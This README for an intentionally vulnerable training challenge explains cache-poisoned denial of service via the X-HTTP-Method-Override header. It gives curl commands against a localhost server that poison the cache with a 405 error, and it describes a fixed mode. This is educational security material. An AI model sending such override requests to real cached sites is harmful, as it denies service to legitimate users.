# CPDoS: HTTP Method Override (HMO)

This challenge demonstrates the "HTTP Method Override" cache poisoning denial-of-service pattern: the origin honors `X-HTTP-Method-Override` (and similar) headers to let a `GET` request be re-interpreted as `DELETE`/`PUT`/`PATCH`, which this endpoint rejects with a `405`. The shared cache/CDN keys purely on the real `GET /` request line, unaware that the override header changed the effective method — so it caches the resulting error and replays it to every subsequent, legitimate `GET /` caller.

## How to run it

```bash
go run main.go serve
```

## Endpoint

- `GET /` — returns `welcome` for normal requests

## Exploiting it

```bash
# a plain GET with a method-override header the origin honors but the cache ignores
curl -s -D - -H "X-HTTP-Method-Override: DELETE" http://localhost:8080/ -o /dev/null

# any subsequent, legitimate GET caller of "/" now gets the cached 405 error
curl -s -D - http://localhost:8080/ -o /dev/null
```

## Modes

The server supports two modes, toggled with the `--vulnerable` flag on the `serve` command (defaults to `true`):

```bash
# vulnerable: method-override headers are honored, and the resulting error is cached
go run main.go serve --vulnerable=true

# fixed: method-override headers are ignored entirely, and error responses are never cached
go run main.go serve --vulnerable=false
```

## Disclaimer

This challenge is intentionally vulnerable. Do not deploy it on a publicly accessible server, as this could expose you to attacks.

Learn more about API security at [Cerberauth](https://www.cerberauth.com/)
